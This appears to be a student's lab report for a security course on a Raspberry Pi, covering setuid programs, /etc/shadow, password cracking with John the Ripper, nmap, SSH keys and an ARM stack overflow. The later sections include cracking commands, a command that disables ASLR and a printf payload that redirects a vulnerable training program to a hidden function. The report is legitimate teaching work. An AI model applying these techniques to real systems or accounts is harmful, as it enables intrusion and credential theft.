## Assignment: *setuid.sh*

The script did not run without warnings:

```
pi@pi-logmans:~/week2/files $ sh -x setuid.sh> setuid.log
+ /bin/rm -rf /tmp/db /tmp/submit
+ mkdir /tmp/db
+ chmod 700 /tmp/db
+ gcc -DDIR="/tmp/db/" -Wall -pedantic Setuid.c
Setuid.c: In function ‘main’:
Setuid.c:29:12: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   29 |     while (gets(buf) != 0) {
      |            ^~~~
      |            fgets
/usr/bin/ld: /tmp/cc12Fx45.o: in function `main':
Setuid.c:(.text+0xcc): warning: the `gets' function is dangerous and should not be used.
+ mv a.out /tmp/submit
+ chmod +s /tmp/submit
+ echo aap
+ /tmp/submit
+ ls -lR /tmp/db /tmp/submit
```

Output of `echo Foo | /tmp/submit` on both users:

| Pi | Pi2 |
|----|-----|
| rid=1000, eid=1000 | rid=1001, eid=1000 |
| rid=1000, eid=1000 | rid=1001, eid=1000 |

Output of `ls -l /tmp/db` on both users:

| Pi | Pi2 |
|----|-----|
| -rw-r--r-- 1 pi pi 4 Oct 31 13:58 1000
-rw-r--r-- 1 pi pi 4 Oct 31 13:58 1001 | ls: cannot open directory '/tmp/db': Permission denied |

The `rid` is the real user id which indeed differs between the two users. `eid` is the effective user id used by the system to identify the program requests. Here it can be seen that `Pi2` uses the same `eid` as `Pi`. The `eid` is the old one first since it needs to evaluate the permissions for the new user by calling it with the old `eid`. After that, the new user evaluates it and then the `eid` is changed.

The difference for `ls -l /tmp/db` is pretty clear: the second user is not allow to open the directory.

## My SD card died, so I had to replace with another one...

## Assignment: *setuid programs*

I used the following command: `sudo find / -perm -4000 -exec ls -ld {} \;`

Which yielded the following results:
```
-rwsr-xr-x 1 root root 39768 May 10 22:12 /usr/sbin/mount.cifs
-rwsr-xr-- 1 root dip 411336 Jan  7  2021 /usr/sbin/pppd
-rwsr-xr-x 1 root root 114648 Jun 28  2021 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root 154272 Jun  8 22:42 /usr/bin/ntfs-3g
-rwsr-xr-x 1 root root 44552 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 178432 Feb 27  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 23536 Jan 26  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 51360 Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 1598264 Jul 21 19:10 /usr/bin/Xvnc
-rwsr-xr-x 1 root root 1598264 Jul 21 19:10 /usr/bin/vncserver-x11
-rwsr-xr-x 1 root root 30880 Jan 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 69080 Feb  2  2021 /usr/bin/ping
-rwsr-xr-x 1 root root 63744 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 39072 Jun 20  2021 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 58224 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 67776 Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 79896 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40400 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-- 1 root messagebus 47176 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 19192 Jul 29  2021 /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper
-rwsr-xr-x 1 root root 473440 Jul  2 00:37 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14888 Jan 26  2022 /usr/libexec/polkit-agent-helper-1
find: ‘/proc/1046/task/1046/fd/5’: No such file or directory
find: ‘/proc/1046/task/1046/fdinfo/5’: No such file or directory
find: ‘/proc/1046/fd/6’: No such file or directory
find: ‘/proc/1046/fdinfo/6’: No such file or directory
```

If I can count correctly this is 22 programs.

The issue with root programs is that they have access to directories/files which are integral to the OS and/or other programs which are normally protected. This is the power and risk that comes with the root user.

## Assignment: *setuid on vfat*

I lost my USB drive and therefore cannot do this assignment.

## Assignment: *Shadow*

`/etc/shadow`  stores all the hashes of the passwords for all users. If this file can be retrieved by any user they could bypass the brute-force protection and crack the password.

## Assignment: *Hash algorithm*

Based on the `/etc/shadow` file my RPi uses `yescrypt`. According to the man pages:

```
CPU time cost parameter
   1 to 11 (logarithmic)
```

## Assignment: *Salts*

A salt is a randm string of bits that is added to the password prior to being hashed. If this was not done one could compute the hash of all passwords and simply look them up. 

## John

I ran this on a Debian machine on my personal server to speed things up. I installed using `sudo apt install john`, then ran `sudo john --incremental=digits passwd-old.txt` and had the following output:

```
Loaded 1 password hash (md5crypt [MD5 32/64 X2])
Will run 8 OpenMP threads
Warning: MaxLen = 20 is too large for the current hash type, reduced to 15
Press 'q' or Ctrl-C to abort, almost any other key for status
12345            (pi)
1g 0:00:00:00 20.00g/s 40960p/s 40960c/s 40960C/s 12345..112506
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So the password is `12345`.

## Assignment: *Iteration count*

As the scale is logarithmic it should be increased by one. This can be done when using `crypt()`as can be seen in `man 3 crypt`.

## Jumbo John

```
sudo apt install build-essential libssl-dev
sudo apt install yasm libgmp-dev libpcap-dev libnss3-dev libkrb5-dev pkg-config libbz2-dev zlib1g-dev
sudo apt install git
git clone https://github.com/magnumripper/JohnTheRipper -b bleeding-jumbo john
cd john/src
./configure && make -s clean && make -sj4
cd ..
sudo ./run/john --subsets=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 --length=5 ~/passwd-new.txt
```

The process took 21 hours, 39 minutes and 52 seconds on my server (4c/8t, Intel i7 10th mobile) and found the password to be `TCS21`.

## Assignment: *nmap*

I had to install both `nmap` and `netcat`. `nmap` revealed two ports being open: `22` and `631`. `Netcat` showed that port `22` is for `ssh` and that `631` is used for `ipp` (internet printing protocol). While `ssh` is obvious, it is not entirely clear why `ipp` is enabled by default.

## Assignment: *SSH public key authentication*

I generated a new keypair using `ssh-keygen` and then copied it over using `ssh-copy-id -i rpi4 pi@pi-logmans.local`.

## Assignment: *Password protected SSH keys*

With the password, an attacker cannot simply copy your SSH keypair file and use it to connect.

## Assignment: *Hardware tokens*

Using such a hardware key one needs to be physically present with the key (suggesting the intended user is actually there and is not impersonated) as there is no file to be copied. It is a layer of physical security. You cannot (cyber)hack what is not connected.

# ARM Exploitation

## Assignment: *ProcessLayout reloaded*

I had no time to do this assignment.

## Assignment: *ASLR*

`ASLR` is Address Space Layout Randomization. This makes sure that programs are located in a different part of the address space everytime they are run. This is to prevent buffer overflow attakcs which target is to overwrite a programs instructions with its own code. It can be disabled using `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`. This does not survive reboot.

## Assignment: *Lottery*


You are indeed not meant to win the lottery which is evidend from `won=0` and `if (won) {} `. However, `gets` can be overflowed (more than 20 characters) which overwrites `won` to be positive.

## Assigment: *Stack protector*

With this stack canary the hack does not work anymore:

```
pi@pi-logmans:~/files $ ./lottery 
Enter your name:
hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
Sorry hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh, you did not win the lottery!
*** stack smashing detected ***: terminated
Aborted
```

## Assignment: *Attack1*

Using `gdb` I was able to find the address of `secret()`:

```
(gdb) break readLine
Breakpoint 1 at 0x1058
(gdb) run
Starting program: /home/pi/files/attac/attack1 

Breakpoint 1, 0x0000005555551058 in readLine ()
(gdb) disassemble secret
Dump of assembler code for function secret:
   0x0000005555551014 <+0>:	stp	x29, x30, [sp, #-16]!
   0x0000005555551018 <+4>:	mov	x29, sp
   0x000000555555101c <+8>:	adrp	x0, 0x5555551000 <code2+8>
   0x0000005555551020 <+12>:	add	x0, x0, #0x130
   0x0000005555551024 <+16>:	bl	0x55555506a0 <system@plt>
   0x0000005555551028 <+20>:	nop
   0x000000555555102c <+24>:	ldp	x29, x30, [sp], #16
   0x0000005555551030 <+28>:	ret
End of assembler dump.
```

## Assignment: *Attack1 return pointer*

Again using `gdb`:

```
(gdb) break readStdin
Breakpoint 1 at 0x1040
(gdb) run
Starting program: /home/pi/files/attac/attack1 

Breakpoint 1, 0x0000005555551040 in readStdin ()
(gdb) dissassemble readStdin
Undefined command: "dissassemble".  Try "help".
(gdb) disassemble readStdin
Dump of assembler code for function readStdin:
   0x0000005555551034 <+0>:	stp	x29, x30, [sp, #-48]!
   0x0000005555551038 <+4>:	mov	x29, sp
   0x000000555555103c <+8>:	add	x0, sp, #0x10
=> 0x0000005555551040 <+12>:	bl	0x55555506e0 <gets@plt>
   0x0000005555551044 <+16>:	nop
   0x0000005555551048 <+20>:	ldp	x29, x30, [sp], #48
   0x000000555555104c <+24>:	ret
End of assembler dump.
```

From here it can be seen that the stackpointer is moved by 16 (decimal). The stack pointer has already been moved 56 addresses, so to overwrite the return pointer we need to move `56-16=40` addresses. Here we can overwrite the return pointer to point to `secret`.

## Assignment: *Attack 1 exploit*

Following the fact that we need to move 40 addresses I created a file which inputs 40 bytes and then the memory address of `secret` using the following command:

`printf '1234567890123456789012345678901234567890\x14\x10\x55\x55\x55' > exploit1`

Which indeed results in the long list of prints.

## Assignment: *Attack 1 with your own code*

This would indeed work. As shown this attack simply points to another function which holds no boundaries as to which one that is.

## Assignment: *Attack1 with stack canaries*

The input does not work anymore as the canary has detected the overflow and aborted the program. However, as stack canaries remain the same throughout the execution of a program, this canary could be leaked through the memory and be added to the exploit.

_I did not have time to do the rest of the exercises._